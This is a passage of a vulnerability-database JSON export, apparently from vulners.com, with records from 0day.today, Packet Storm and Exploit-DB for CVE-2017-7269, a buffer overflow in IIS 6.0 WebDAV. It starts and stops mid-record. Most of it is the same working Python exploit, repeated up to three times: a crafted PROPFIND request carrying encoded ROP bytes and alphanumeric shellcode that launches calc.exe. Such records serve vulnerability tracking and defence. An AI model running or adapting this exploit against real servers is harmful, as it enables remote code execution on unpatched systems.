\xe3\\x88\\xb0\\xe3\\x9d\\xae\\xe4\\xad\\x89\\xe5\\x89\\x8d\\xe4\\xa1\\xa3\\xe6\\xbd\\x8c\\xe7\\x95\\x96\\xe7\\x95\\xb5\\xe6\\x99\\xaf\\xe7\\x99\\xa8\\xe4\\x91\\x8d\\xe5\\x81\\xb0\\xe7\\xa8\\xb6\\xe6\\x89\\x8b\\xe6\\x95\\x97\\xe7\\x95\\x90\\xe6\\xa9\\xb2\\xe7\\xa9\\xab\\xe7\\x9d\\xa2\\xe7\\x99\\x98\\xe6\\x89\\x88\\xe6\\x94\\xb1\\xe3\\x81\\x94\\xe6\\xb1\\xb9\\xe5\\x81\\x8a\\xe5\\x91\\xa2\\xe5\\x80\\xb3\\xe3\\x95\\xb7\\xe6\\xa9\\xb7\\xe4\\x85\\x84\\xe3\\x8c\\xb4\\xe6\\x91\\xb6\\xe4\\xb5\\x86\\xe5\\x99\\x94\\xe4\\x9d\\xac\\xe6\\x95\\x83\\xe7\\x98\\xb2\\xe7\\x89\\xb8\\xe5\\x9d\\xa9\\xe4\\x8c\\xb8\\xe6\\x89\\xb2\\xe5\\xa8\\xb0\\xe5\\xa4\\xb8\\xe5\\x91\\x88\\xc8\\x82\\xc8\\x82\\xe1\\x8b\\x80\\xe6\\xa0\\x83\\xe6\\xb1\\x84\\xe5\\x89\\x96\\xe4\\xac\\xb7\\xe6\\xb1\\xad\\xe4\\xbd\\x98\\xe5\\xa1\\x9a\\xe7\\xa5\\x90\\xe4\\xa5\\xaa\\xe5\\xa1\\x8f\\xe4\\xa9\\x92\\xe4\\x85\\x90\\xe6\\x99\\x8d\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\xa0\\xb4\\xe6\\x94\\xb1\\xe6\\xbd\\x83\\xe6\\xb9\\xa6\\xe7\\x91\\x81\\xe4\\x8d\\xac\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe5\\x8d\\x83\\xe6\\xa9\\x81\\xe7\\x81\\x92\\xe3\\x8c\\xb0\\xe5\\xa1\\xa6\\xe4\\x89\\x8c\\xe7\\x81\\x8b\\xe6\\x8d\\x86\\xe5\\x85\\xb3\\xe7\\xa5\\x81\\xe7\\xa9\\x90\\xe4\\xa9\\xac'\r\npay+='>'\r\npay+=' (Not <locktoken:write1>) <http://localhost/bbbbbbb'\r\npay+='\\xe7\\xa5\\x88\\xe6\\x85\\xb5\\xe4\\xbd\\x83\\xe6\\xbd\\xa7\\xe6\\xad\\xaf\\xe4\\xa1\\x85\\xe3\\x99\\x86\\xe6\\x9d\\xb5\\xe4\\x90\\xb3\\xe3\\xa1\\xb1\\xe5\\x9d\\xa5\\xe5\\xa9\\xa2\\xe5\\x90\\xb5\\xe5\\x99\\xa1\\xe6\\xa5\\x92\\xe6\\xa9\\x93\\xe5\\x85\\x97\\xe3\\xa1\\x8e\\xe5\\xa5\\x88\\xe6\\x8d\\x95\\xe4\\xa5\\xb1\\xe4\\x8d\\xa4\\xe6\\x91\\xb2\\xe3\\x91\\xa8\\xe4\\x9d\\x98\\xe7\\x85\\xb9\\xe3\\x8d\\xab\\xe6\\xad\\x95\\xe6\\xb5\\x88\\xe5\\x81\\x8f\\xe7\\xa9\\x86\\xe3\\x91\\xb1\\xe6\\xbd\\x94\\xe7\\x91\\x83\\xe5\\xa5\\x96\\xe6\\xbd\\xaf\\xe7\\x8d\\x81\\xe3\\x91\\x97\\xe6\\x85\\xa8\\xe7\\xa9\\xb2\\xe3\\x9d\\x85\\xe4\\xb5\\x89\\xe5\\x9d\\x8e\\xe5\\x91\\x88\\xe4\\xb0\\xb8\\xe3\\x99\\xba\\xe3\\x95\\xb2\\xe6\\x89\\xa6\\xe6\\xb9\\x83\\xe4\\xa1\\xad\\xe3\\x95\\x88\\xe6\\x85\\xb7\\xe4\\xb5\\x9a\\xe6\\x85\\xb4\\xe4\\x84\\xb3\\xe4\\x8d\\xa5\\xe5\\x89\\xb2\\xe6\\xb5\\xa9\\xe3\\x99\\xb1\\xe4\\xb9\\xa4\\xe6\\xb8\\xb9\\xe6\\x8d\\x93\\xe6\\xad\\xa4\\xe5\\x85\\x86\\xe4\\xbc\\xb0\\xe7\\xa1\\xaf\\xe7\\x89\\x93\\xe6\\x9d\\x90\\xe4\\x95\\x93\\xe7\\xa9\\xa3\\xe7\\x84\\xb9\\xe4\\xbd\\x93\\xe4\\x91\\x96\\xe6\\xbc\\xb6\\xe7\\x8d\\xb9\\xe6\\xa1\\xb7\\xe7\\xa9\\x96\\xe6\\x85\\x8a\\xe3\\xa5\\x85\\xe3\\x98\\xb9\\xe6\\xb0\\xb9\\xe4\\x94\\xb1\\xe3\\x91\\xb2\\xe5\\x8d\\xa5\\xe5\\xa1\\x8a\\xe4\\x91\\x8e\\xe7\\xa9\\x84\\xe6\\xb0\\xb5\\xe5\\xa9\\x96\\xe6\\x89\\x81\\xe6\\xb9\\xb2\\xe6\\x98\\xb1\\xe5\\xa5\\x99\\xe5\\x90\\xb3\\xe3\\x85\\x82\\xe5\\xa1\\xa5\\xe5\\xa5\\x81\\xe7\\x85\\x90\\xe3\\x80\\xb6\\xe5\\x9d\\xb7\\xe4\\x91\\x97\\xe5\\x8d\\xa1\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe4\\x89\\x87\\xe7\\x99\\xaa\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\x89\\x97\\xe4\\xbd\\xb4\\xe5\\xa5\\x87\\xe5\\x88\\xb4\\xe4\\xad\\xa6\\xe4\\xad\\x82\\xe7\\x91\\xa4\\xe7\\xa1\\xaf\\xe6\\x82\\x82\\xe6\\xa0\\x81\\xe5\\x84\\xb5\\xe7\\x89\\xba\\xe7\\x91\\xba\\xe4\\xb5\\x87\\xe4\\x91\\x99\\xe5\\x9d\\x97\\xeb\\x84\\x93\\xe6\\xa0\\x80\\xe3\\x85\\xb6\\xe6\\xb9\\xaf\\xe2\\x93\\xa3\\xe6\\xa0\\x81\\xe1\\x91\\xa0\\xe6\\xa0\\x83\\xcc\\x80\\xe7\\xbf\\xbe\\xef\\xbf\\xbf\\xef\\xbf\\xbf\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xd1\\xae\\xe6\\xa0\\x83\\xe7\\x85\\xae\\xe7\\x91\\xb0\\xe1\\x90\\xb4\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81\\xe9\\x8e\\x91\\xe6\\xa0\\x80\\xe3\\xa4\\xb1\\xe6\\x99\\xae\\xe4\\xa5\\x95\\xe3\\x81\\x92\\xe5\\x91\\xab\\xe7\\x99\\xab\\xe7\\x89\\x8a\\xe7\\xa5\\xa1\\xe1\\x90\\x9c\\xe6\\xa0\\x83\\xe6\\xb8\\x85\\xe6\\xa0\\x80\\xe7\\x9c\\xb2\\xe7\\xa5\\xa8\\xe4\\xb5\\xa9\\xe3\\x99\\xac\\xe4\\x91\\xa8\\xe4\\xb5\\xb0\\xe8\\x89\\x86\\xe6\\xa0\\x80\\xe4\\xa1\\xb7\\xe3\\x89\\x93\\xe1\\xb6\\xaa\\xe6\\xa0\\x82\\xe6\\xbd\\xaa\\xe4\\x8c\\xb5\\xe1\\x8f\\xb8\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81'\r\n \r\nshellcode='VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB6X6WMV7O7Z8Z8Y8Y2TMTJT1M017Y6Q01010ELSKS0ELS3SJM0K7T0J061K4K6U7W5KJLOLMR5ZNL0ZMV5L5LMX1ZLP0V3L5O5SLZ5Y4PKT4P4O5O4U3YJL7NLU8PMP1QMTMK051P1Q0F6T00NZLL2K5U0O0X6P0NKS0L6P6S8S2O4Q1U1X06013W7M0B2X5O5R2O02LTLPMK7UKL1Y9T1Z7Q0FLW2RKU1P7XKQ3O4S2ULR0DJN5Q4W1O0HMQLO3T1Y9V8V0O1U0C5LKX1Y0R2QMS4U9O2T9TML5K0RMP0E3OJZ2QMSNNKS1Q4L4O5Q9YMP9K9K6SNNLZ1Y8NMLML2Q8Q002U100Z9OKR1M3Y5TJM7OLX8P3ULY7Y0Y7X4YMW5MJULY7R1MKRKQ5W0X0N3U1KLP9O1P1L3W9P5POO0F2SMXJNJMJS8KJNKPA'\r\n \r\npay+=shellcode\r\npay+='>\\r\\n\\r\\n'\r\nprint pay\r\n \r\nsock.send(pay)  \r\ndata = sock.recv(80960)  \r\n \r\nprint data \r\nsock.close\n\n#  0day.today [2018-02-09]  #",
            "cvss": {
                "score": 10.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/zdt/1337DAY-ID-27446"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2017-03-27T00:00:00",
            "published": "2017-03-27T00:00:00",
            "href": "https://packetstormsecurity.com/files/141997/Microsoft-IIS-6.0-WebDAV-ScStoragePathFromUrl-Buffer-Overflow.html",
            "id": "PACKETSTORM:141997",
            "title": "Microsoft IIS 6.0 WebDAV ScStoragePathFromUrl Buffer Overflow",
            "type": "packetstorm",
            "sourceData": "`Description:Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2 allows remote attackers to execute arbitrary code via a long header beginning with \"If: <http://\" in a PROPFIND request, as exploited in the wild in July or August 2016.  \n  \nAdditional Information: the ScStoragePathFromUrl function is called twice  \nVulnerability Type: Buffer overflow  \nVendor of Product: Microsoft  \nAffected Product Code Base: Windows Server 2003 R2  \nAffected Component: ScStoragePathFromUrl  \nAttack Type: Remote  \nImpact Code execution: true  \nAttack Vectors: crafted PROPFIND data  \n  \nHas vendor confirmed or acknowledged the vulnerability?:true  \n  \nDiscoverer:Zhiniang Peng and Chen Wu.  \nInformation Security Lab & School of Computer Science & Engineering, South China University of Technology Guangzhou, China  \n'''  \n  \n#------------Our payload set up a ROP chain by using the overflow 3 times. It will launch a calc.exe which shows the bug is really dangerous.  \n#written by Zhiniang Peng and Chen Wu. Information Security Lab & School of Computer Science & Engineering, South China University of Technology Guangzhou, China   \n#-----------Email: edwardz@foxmail.com  \n  \nimport socket   \n  \nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   \nsock.connect(('127.0.0.1',80))   \n  \npay='PROPFIND / HTTP/1.1\\r\\nHost: localhost\\r\\nContent-Length: 0\\r\\n'  \npay+='If: <http://localhost/aaaaaaa'  \npay+='\\xe6\\xbd\\xa8\\xe7\\xa1\\xa3\\xe7\\x9d\\xa1\\xe7\\x84\\xb3\\xe6\\xa4\\xb6\\xe4\\x9d\\xb2\\xe7\\xa8\\xb9\\xe4\\xad\\xb7\\xe4\\xbd\\xb0\\xe7\\x95\\x93\\xe7\\xa9\\x8f\\xe4\\xa1\\xa8\\xe5\\x99\\xa3\\xe6\\xb5\\x94\\xe6\\xa1\\x85\\xe3\\xa5\\x93\\xe5\\x81\\xac\\xe5\\x95\\xa7\\xe6\\x9d\\xa3\\xe3\\x8d\\xa4\\xe4\\x98\\xb0\\xe7\\xa1\\x85\\xe6\\xa5\\x92\\xe5\\x90\\xb1\\xe4\\xb1\\x98\\xe6\\xa9\\x91\\xe7\\x89\\x81\\xe4\\x88\\xb1\\xe7\\x80\\xb5\\xe5\\xa1\\x90\\xe3\\x99\\xa4\\xe6\\xb1\\x87\\xe3\\x94\\xb9\\xe5\\x91\\xaa\\xe5\\x80\\xb4\\xe5\\x91\\x83\\xe7\\x9d\\x92\\xe5\\x81\\xa1\\xe3\\x88\\xb2\\xe6\\xb5\\x8b\\xe6\\xb0\\xb4\\xe3\\x89\\x87\\xe6\\x89\\x81\\xe3\\x9d\\x8d\\xe5\\x85\\xa1\\xe5\\xa1\\xa2\\xe4\\x9d\\xb3\\xe5\\x89\\x90\\xe3\\x99\\xb0\\xe7\\x95\\x84\\xe6\\xa1\\xaa\\xe3\\x8d\\xb4\\xe4\\xb9\\x8a\\xe7\\xa1\\xab\\xe4\\xa5\\xb6\\xe4\\xb9\\xb3\\xe4\\xb1\\xaa\\xe5\\x9d\\xba\\xe6\\xbd\\xb1\\xe5\\xa1\\x8a\\xe3\\x88\\xb0\\xe3\\x9d\\xae\\xe4\\xad\\x89\\xe5\\x89\\x8d\\xe4\\xa1\\xa3\\xe6\\xbd\\x8c\\xe7\\x95\\x96\\xe7\\x95\\xb5\\xe6\\x99\\xaf\\xe7\\x99\\xa8\\xe4\\x91\\x8d\\xe5\\x81\\xb0\\xe7\\xa8\\xb6\\xe6\\x89\\x8b\\xe6\\x95\\x97\\xe7\\x95\\x90\\xe6\\xa9\\xb2\\xe7\\xa9\\xab\\xe7\\x9d\\xa2\\xe7\\x99\\x98\\xe6\\x89\\x88\\xe6\\x94\\xb1\\xe3\\x81\\x94\\xe6\\xb1\\xb9\\xe5\\x81\\x8a\\xe5\\x91\\xa2\\xe5\\x80\\xb3\\xe3\\x95\\xb7\\xe6\\xa9\\xb7\\xe4\\x85\\x84\\xe3\\x8c\\xb4\\xe6\\x91\\xb6\\xe4\\xb5\\x86\\xe5\\x99\\x94\\xe4\\x9d\\xac\\xe6\\x95\\x83\\xe7\\x98\\xb2\\xe7\\x89\\xb8\\xe5\\x9d\\xa9\\xe4\\x8c\\xb8\\xe6\\x89\\xb2\\xe5\\xa8\\xb0\\xe5\\xa4\\xb8\\xe5\\x91\\x88\\xc8\\x82\\xc8\\x82\\xe1\\x8b\\x80\\xe6\\xa0\\x83\\xe6\\xb1\\x84\\xe5\\x89\\x96\\xe4\\xac\\xb7\\xe6\\xb1\\xad\\xe4\\xbd\\x98\\xe5\\xa1\\x9a\\xe7\\xa5\\x90\\xe4\\xa5\\xaa\\xe5\\xa1\\x8f\\xe4\\xa9\\x92\\xe4\\x85\\x90\\xe6\\x99\\x8d\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\xa0\\xb4\\xe6\\x94\\xb1\\xe6\\xbd\\x83\\xe6\\xb9\\xa6\\xe7\\x91\\x81\\xe4\\x8d\\xac\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe5\\x8d\\x83\\xe6\\xa9\\x81\\xe7\\x81\\x92\\xe3\\x8c\\xb0\\xe5\\xa1\\xa6\\xe4\\x89\\x8c\\xe7\\x81\\x8b\\xe6\\x8d\\x86\\xe5\\x85\\xb3\\xe7\\xa5\\x81\\xe7\\xa9\\x90\\xe4\\xa9\\xac'  \npay+='>'  \npay+=' (Not <locktoken:write1>) <http://localhost/bbbbbbb'  \npay+='\\xe7\\xa5\\x88\\xe6\\x85\\xb5\\xe4\\xbd\\x83\\xe6\\xbd\\xa7\\xe6\\xad\\xaf\\xe4\\xa1\\x85\\xe3\\x99\\x86\\xe6\\x9d\\xb5\\xe4\\x90\\xb3\\xe3\\xa1\\xb1\\xe5\\x9d\\xa5\\xe5\\xa9\\xa2\\xe5\\x90\\xb5\\xe5\\x99\\xa1\\xe6\\xa5\\x92\\xe6\\xa9\\x93\\xe5\\x85\\x97\\xe3\\xa1\\x8e\\xe5\\xa5\\x88\\xe6\\x8d\\x95\\xe4\\xa5\\xb1\\xe4\\x8d\\xa4\\xe6\\x91\\xb2\\xe3\\x91\\xa8\\xe4\\x9d\\x98\\xe7\\x85\\xb9\\xe3\\x8d\\xab\\xe6\\xad\\x95\\xe6\\xb5\\x88\\xe5\\x81\\x8f\\xe7\\xa9\\x86\\xe3\\x91\\xb1\\xe6\\xbd\\x94\\xe7\\x91\\x83\\xe5\\xa5\\x96\\xe6\\xbd\\xaf\\xe7\\x8d\\x81\\xe3\\x91\\x97\\xe6\\x85\\xa8\\xe7\\xa9\\xb2\\xe3\\x9d\\x85\\xe4\\xb5\\x89\\xe5\\x9d\\x8e\\xe5\\x91\\x88\\xe4\\xb0\\xb8\\xe3\\x99\\xba\\xe3\\x95\\xb2\\xe6\\x89\\xa6\\xe6\\xb9\\x83\\xe4\\xa1\\xad\\xe3\\x95\\x88\\xe6\\x85\\xb7\\xe4\\xb5\\x9a\\xe6\\x85\\xb4\\xe4\\x84\\xb3\\xe4\\x8d\\xa5\\xe5\\x89\\xb2\\xe6\\xb5\\xa9\\xe3\\x99\\xb1\\xe4\\xb9\\xa4\\xe6\\xb8\\xb9\\xe6\\x8d\\x93\\xe6\\xad\\xa4\\xe5\\x85\\x86\\xe4\\xbc\\xb0\\xe7\\xa1\\xaf\\xe7\\x89\\x93\\xe6\\x9d\\x90\\xe4\\x95\\x93\\xe7\\xa9\\xa3\\xe7\\x84\\xb9\\xe4\\xbd\\x93\\xe4\\x91\\x96\\xe6\\xbc\\xb6\\xe7\\x8d\\xb9\\xe6\\xa1\\xb7\\xe7\\xa9\\x96\\xe6\\x85\\x8a\\xe3\\xa5\\x85\\xe3\\x98\\xb9\\xe6\\xb0\\xb9\\xe4\\x94\\xb1\\xe3\\x91\\xb2\\xe5\\x8d\\xa5\\xe5\\xa1\\x8a\\xe4\\x91\\x8e\\xe7\\xa9\\x84\\xe6\\xb0\\xb5\\xe5\\xa9\\x96\\xe6\\x89\\x81\\xe6\\xb9\\xb2\\xe6\\x98\\xb1\\xe5\\xa5\\x99\\xe5\\x90\\xb3\\xe3\\x85\\x82\\xe5\\xa1\\xa5\\xe5\\xa5\\x81\\xe7\\x85\\x90\\xe3\\x80\\xb6\\xe5\\x9d\\xb7\\xe4\\x91\\x97\\xe5\\x8d\\xa1\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe4\\x89\\x87\\xe7\\x99\\xaa\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\x89\\x97\\xe4\\xbd\\xb4\\xe5\\xa5\\x87\\xe5\\x88\\xb4\\xe4\\xad\\xa6\\xe4\\xad\\x82\\xe7\\x91\\xa4\\xe7\\xa1\\xaf\\xe6\\x82\\x82\\xe6\\xa0\\x81\\xe5\\x84\\xb5\\xe7\\x89\\xba\\xe7\\x91\\xba\\xe4\\xb5\\x87\\xe4\\x91\\x99\\xe5\\x9d\\x97\\xeb\\x84\\x93\\xe6\\xa0\\x80\\xe3\\x85\\xb6\\xe6\\xb9\\xaf\\xe2\\x93\\xa3\\xe6\\xa0\\x81\\xe1\\x91\\xa0\\xe6\\xa0\\x83\\xcc\\x80\\xe7\\xbf\\xbe\\xef\\xbf\\xbf\\xef\\xbf\\xbf\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xd1\\xae\\xe6\\xa0\\x83\\xe7\\x85\\xae\\xe7\\x91\\xb0\\xe1\\x90\\xb4\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81\\xe9\\x8e\\x91\\xe6\\xa0\\x80\\xe3\\xa4\\xb1\\xe6\\x99\\xae\\xe4\\xa5\\x95\\xe3\\x81\\x92\\xe5\\x91\\xab\\xe7\\x99\\xab\\xe7\\x89\\x8a\\xe7\\xa5\\xa1\\xe1\\x90\\x9c\\xe6\\xa0\\x83\\xe6\\xb8\\x85\\xe6\\xa0\\x80\\xe7\\x9c\\xb2\\xe7\\xa5\\xa8\\xe4\\xb5\\xa9\\xe3\\x99\\xac\\xe4\\x91\\xa8\\xe4\\xb5\\xb0\\xe8\\x89\\x86\\xe6\\xa0\\x80\\xe4\\xa1\\xb7\\xe3\\x89\\x93\\xe1\\xb6\\xaa\\xe6\\xa0\\x82\\xe6\\xbd\\xaa\\xe4\\x8c\\xb5\\xe1\\x8f\\xb8\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81'  \n  \nshellcode='VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB6X6WMV7O7Z8Z8Y8Y2TMTJT1M017Y6Q01010ELSKS0ELS3SJM0K7T0J061K4K6U7W5KJLOLMR5ZNL0ZMV5L5LMX1ZLP0V3L5O5SLZ5Y4PKT4P4O5O4U3YJL7NLU8PMP1QMTMK051P1Q0F6T00NZLL2K5U0O0X6P0NKS0L6P6S8S2O4Q1U1X06013W7M0B2X5O5R2O02LTLPMK7UKL1Y9T1Z7Q0FLW2RKU1P7XKQ3O4S2ULR0DJN5Q4W1O0HMQLO3T1Y9V8V0O1U0C5LKX1Y0R2QMS4U9O2T9TML5K0RMP0E3OJZ2QMSNNKS1Q4L4O5Q9YMP9K9K6SNNLZ1Y8NMLML2Q8Q002U100Z9OKR1M3Y5TJM7OLX8P3ULY7Y0Y7X4YMW5MJULY7R1MKRKQ5W0X0N3U1KLP9O1P1L3W9P5POO0F2SMXJNJMJS8KJNKPA'  \n  \npay+=shellcode  \npay+='>\\r\\n\\r\\n'  \nprint pay  \n  \nsock.send(pay)   \ndata = sock.recv(80960)   \n  \nprint data   \nsock.close  \n  \n`\n",
            "cvss": {
                "score": 10.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:141997"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Internet Information Services (IIS) 6.0 WebDAV - 'ScStoragePathFromUrl' Buffer Overflow. CVE-2017-7269. Remote exploit for Windows platform",
            "modified": "2017-03-27T00:00:00",
            "published": "2017-03-27T00:00:00",
            "id": "EDB-ID:41738",
            "href": "https://www.exploit-db.com/exploits/41738/",
            "type": "exploitdb",
            "title": "Internet Information Services (IIS) 6.0 WebDAV - 'ScStoragePathFromUrl' Buffer Overflow",
            "sourceData": "'''\r\nDescription:Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2 allows remote attackers to execute arbitrary code via a long header beginning with \"If: <http://\" in a PROPFIND request, as exploited in the wild in July or August 2016.\r\n\r\nAdditional Information: the ScStoragePathFromUrl function is called twice\r\nVulnerability Type: Buffer overflow\r\nVendor of Product: Microsoft\r\nAffected Product Code Base: Windows Server 2003 R2\r\nAffected Component: ScStoragePathFromUrl\r\nAttack Type: Remote\r\nImpact Code execution: true\r\nAttack Vectors: crafted PROPFIND data\r\n\r\nHas vendor confirmed or acknowledged the vulnerability?:true\r\n\r\nDiscoverer:Zhiniang Peng and Chen Wu.\r\nInformation Security Lab & School of Computer Science & Engineering, South China University of Technology Guangzhou, China\r\n'''\r\n\r\n#------------Our payload set up a ROP chain by using the overflow 3 times. It will launch a calc.exe which shows the bug is really dangerous.\r\n#written by Zhiniang Peng and Chen Wu. Information Security Lab & School of Computer Science & Engineering, South China University of Technology Guangzhou, China \r\n#-----------Email: edwardz@foxmail.com\r\n\r\nimport socket  \r\n\r\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  \r\nsock.connect(('127.0.0.1',80))  \r\n\r\npay='PROPFIND / HTTP/1.1\\r\\nHost: localhost\\r\\nContent-Length: 0\\r\\n'\r\npay+='If: <http://localhost/aaaaaaa'\r\npay+='\\xe6\\xbd\\xa8\\xe7\\xa1\\xa3\\xe7\\x9d\\xa1\\xe7\\x84\\xb3\\xe6\\xa4\\xb6\\xe4\\x9d\\xb2\\xe7\\xa8\\xb9\\xe4\\xad\\xb7\\xe4\\xbd\\xb0\\xe7\\x95\\x93\\xe7\\xa9\\x8f\\xe4\\xa1\\xa8\\xe5\\x99\\xa3\\xe6\\xb5\\x94\\xe6\\xa1\\x85\\xe3\\xa5\\x93\\xe5\\x81\\xac\\xe5\\x95\\xa7\\xe6\\x9d\\xa3\\xe3\\x8d\\xa4\\xe4\\x98\\xb0\\xe7\\xa1\\x85\\xe6\\xa5\\x92\\xe5\\x90\\xb1\\xe4\\xb1\\x98\\xe6\\xa9\\x91\\xe7\\x89\\x81\\xe4\\x88\\xb1\\xe7\\x80\\xb5\\xe5\\xa1\\x90\\xe3\\x99\\xa4\\xe6\\xb1\\x87\\xe3\\x94\\xb9\\xe5\\x91\\xaa\\xe5\\x80\\xb4\\xe5\\x91\\x83\\xe7\\x9d\\x92\\xe5\\x81\\xa1\\xe3\\x88\\xb2\\xe6\\xb5\\x8b\\xe6\\xb0\\xb4\\xe3\\x89\\x87\\xe6\\x89\\x81\\xe3\\x9d\\x8d\\xe5\\x85\\xa1\\xe5\\xa1\\xa2\\xe4\\x9d\\xb3\\xe5\\x89\\x90\\xe3\\x99\\xb0\\xe7\\x95\\x84\\xe6\\xa1\\xaa\\xe3\\x8d\\xb4\\xe4\\xb9\\x8a\\xe7\\xa1\\xab\\xe4\\xa5\\xb6\\xe4\\xb9\\xb3\\xe4\\xb1\\xaa\\xe5\\x9d\\xba\\xe6\\xbd\\xb1\\xe5\\xa1\\x8a\\xe3\\x88\\xb0\\xe3\\x9d\\xae\\xe4\\xad\\x89\\xe5\\x89\\x8d\\xe4\\xa1\\xa3\\xe6\\xbd\\x8c\\xe7\\x95\\x96\\xe7\\x95\\xb5\\xe6\\x99\\xaf\\xe7\\x99\\xa8\\xe4\\x91\\x8d\\xe5\\x81\\xb0\\xe7\\xa8\\xb6\\xe6\\x89\\x8b\\xe6\\x95\\x97\\xe7\\x95\\x90\\xe6\\xa9\\xb2\\xe7\\xa9\\xab\\xe7\\x9d\\xa2\\xe7\\x99\\x98\\xe6\\x89\\x88\\xe6\\x94\\xb1\\xe3\\x81\\x94\\xe6\\xb1\\xb9\\xe5\\x81\\x8a\\xe5\\x91\\xa2\\xe5\\x80\\xb3\\xe3\\x95\\xb7\\xe6\\xa9\\xb7\\xe4\\x85\\x84\\xe3\\x8c\\xb4\\xe6\\x91\\xb6\\xe4\\xb5\\x86\\xe5\\x99\\x94\\xe4\\x9d\\xac\\xe6\\x95\\x83\\xe7\\x98\\xb2\\xe7\\x89\\xb8\\xe5\\x9d\\xa9\\xe4\\x8c\\xb8\\xe6\\x89\\xb2\\xe5\\xa8\\xb0\\xe5\\xa4\\xb8\\xe5\\x91\\x88\\xc8\\x82\\xc8\\x82\\xe1\\x8b\\x80\\xe6\\xa0\\x83\\xe6\\xb1\\x84\\xe5\\x89\\x96\\xe4\\xac\\xb7\\xe6\\xb1\\xad\\xe4\\xbd\\x98\\xe5\\xa1\\x9a\\xe7\\xa5\\x90\\xe4\\xa5\\xaa\\xe5\\xa1\\x8f\\xe4\\xa9\\x92\\xe4\\x85\\x90\\xe6\\x99\\x8d\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\xa0\\xb4\\xe6\\x94\\xb1\\xe6\\xbd\\x83\\xe6\\xb9\\xa6\\xe7\\x91\\x81\\xe4\\x8d\\xac\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe5\\x8d\\x83\\xe6\\xa9\\x81\\xe7\\x81\\x92\\xe3\\x8c\\xb0\\xe5\\xa1\\xa6\\xe4\\x89\\x8c\\xe7\\x81\\x8b\\xe6\\x8d\\x86\\xe5\\x85\\xb3\\xe7\\xa5\\x81\\xe7\\xa9\\x90\\xe4\\xa9\\xac'\r\npay+='>'\r\npay+=' (Not <locktoken:write1>) <http://localhost/bbbbbbb'\r\npay+='\\xe7\\xa5\\x88\\xe6\\x85\\xb5\\xe4\\xbd\\x83\\xe6\\xbd\\xa7\\xe6\\xad\\xaf\\xe4\\xa1\\x85\\xe3\\x99\\x86\\xe6\\x9d\\xb5\\xe4\\x90\\xb3\\xe3\\xa1\\xb1\\xe5\\x9d\\xa5\\xe5\\xa9\\xa2\\xe5\\x90\\xb5\\xe5\\x99\\xa1\\xe6\\xa5\\x92\\xe6\\xa9\\x93\\xe5\\x85\\x97\\xe3\\xa1\\x8e\\xe5\\xa5\\x88\\xe6\\x8d\\x95\\xe4\\xa5\\xb1\\xe4\\x8d\\xa4\\xe6\\x91\\xb2\\xe3\\x91\\xa8\\xe4\\x9d\\x98\\xe7\\x85\\xb9\\xe3\\x8d\\xab\\xe6\\xad\\x95\\xe6\\xb5\\x88\\xe5\\x81\\x8f\\xe7\\xa9\\x86\\xe3\\x91\\xb1\\xe6\\xbd\\x94\\xe7\\x91\\x83\\xe5\\xa5\\x96\\xe6\\xbd\\xaf\\xe7\\x8d\\x81\\xe3\\x91\\x97\\xe6\\x85\\xa8\\xe7\\xa9\\xb2\\xe3\\x9d\\x85\\xe4\\xb5\\x89\\xe5\\x9d\\x8e\\xe5\\x91\\x88\\xe4\\xb0\\xb8\\xe3\\x99\\xba\\xe3\\x95\\xb2\\xe6\\x89\\xa6\\xe6\\xb9\\x83\\xe4\\xa1\\xad\\xe3\\x95\\x88\\xe6\\x85\\xb7\\xe4\\xb5\\x9a\\xe6\\x85\\xb4\\xe4\\x84\\xb3\\xe4\\x8d\\xa5\\xe5\\x89\\xb2\\xe6\\xb5\\xa9\\xe3\\x99\\xb1\\xe4\\xb9\\xa4\\xe6\\xb8\\xb9\\xe6\\x8d\\x93\\xe6\\xad\\xa4\\xe5\\x85\\x86\\xe4\\xbc\\xb0\\xe7\\xa1\\xaf\\xe7\\x89\\x93\\xe6\\x9d\\x90\\xe4\\x95\\x93\\xe7\\xa9\\xa3\\xe7\\x84\\xb9\\xe4\\xbd\\x93\\xe4\\x91\\x96\\xe6\\xbc\\xb6\\xe7\\x8d\\xb9\\xe6\\xa1\\xb7\\xe7\\xa9\\x96\\xe6\\x85\\x8a\\xe3\\xa5\\x85\\xe3\\x98\\xb9\\xe6\\xb0\\xb